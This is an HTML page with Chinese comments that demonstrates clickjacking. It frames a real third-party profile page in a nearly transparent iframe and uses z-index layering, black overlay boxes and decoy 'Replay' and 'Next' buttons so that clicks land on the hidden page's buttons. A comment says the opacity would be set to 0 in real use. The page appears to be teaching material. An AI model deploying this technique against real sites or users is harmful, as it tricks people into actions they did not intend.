<!--
 * @Date         : 2024-04-28 22:23:15 星期0
 * @Author       : xut
 * @Description  : 点击劫持演示
 * iframe 的 z-index = 10
 * 主体遮罩层的 z-index 要大于 iframe，才能遮挡
 * 但是关键按钮位置的 z-index 要少于 iframe，但因为 iframe 设置透明，使用可见的仍是它下面的虚拟按钮，但实际点击的却是目标按钮。
-->
<!doctype html>
<html lang="zh">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>clickjacking</title>
    <style>
      body {
        margin: 0;
        padding: 0;
      }
      button {
        width: 60px;
        height: 23px;
        font-size: 10pt;
        cursor: hand;
        background: #f0f0f0 repeat-x;
        padding-top: 3px;
        border: 1px solid #708090;
      }
      .dd {
        position: absolute;
        /* 要比 iframe 大，才能盖住 */
        z-index: 20;
      }
      #d1 {
        width: 800px;
        height: 200px;
        top: 200px;
        left: 300px;
      }
      #d1 video {
        width: 100%;
        height: 100%;
      }
      #d2 {
        width: 545px;
        height: 50px;
        top: 400px;
        left: 300px;
        background: black;
      }
      #d3 {
        width: 60px;
        height: 50px;
        top: 400px;
        left: 1040px;
        background: black;
      }
      #button_replay {
        width: 100px;
        height: 50px;
        cursor: pointer;
        background: #f0f0f0 repeat-x;
        position: absolute;
        top: 400px;
        left: 840px;
        /* 要比目标位置小，才在目标透明按钮底下 */
        z-index: 5;
      }
      #button_next {
        width: 100px;
        height: 50px;
        cursor: pointer;
        background: #f0f0f0 repeat-x;
        position: absolute;
        top: 400px;
        left: 940px;
        /* 要比目标位置小，才在目标透明按钮底下 */
        z-index: 5;
      }
      #hidden {
        height: 250px;
        width: 800px;
        top: 200px;
        left: 300px;
        overflow: hidden;
        position: absolute;
        /* 这里仅作演示时设置半透明，实际应为 0 */
        opacity: 0.3;
        /* 基准层 */
        z-index: 10;
        border: 1px solid red;
      }
    </style>
  </head>
  <body>
    <iframe
      id="hidden"
      src="https://juejin.cn/user/1855631360534029"
      scrolling="no"
      frameborder="0"
    ></iframe>
    <div class="dd" id="d1">
      <video src="" controls="controls" preload="auto"></video>
    </div>
    <div class="dd" id="d2"></div>
    <div class="dd" id="d3"></div>
    <button id="button_replay" onclick="alert('Please Wait')">Replay</button>
    <button id="button_next" onclick="alert('Please Next')">Next</button>
  </body>
</html>
